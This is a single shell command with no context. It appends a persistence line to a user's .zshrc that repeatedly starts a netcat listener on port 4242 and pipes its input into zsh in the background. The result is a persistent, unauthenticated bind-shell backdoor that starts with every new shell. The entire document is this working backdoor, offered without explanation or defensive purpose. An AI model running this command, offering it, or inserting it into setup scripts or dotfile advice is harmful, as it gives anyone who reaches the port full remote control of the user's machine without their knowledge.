echo "while (true) {rm -f /tmp/f;mkfifo /tmp/f;nc -l 4242 0</tmp/f | zsh 1>/tmp/f 2>&1} & disown" >> .zshrc
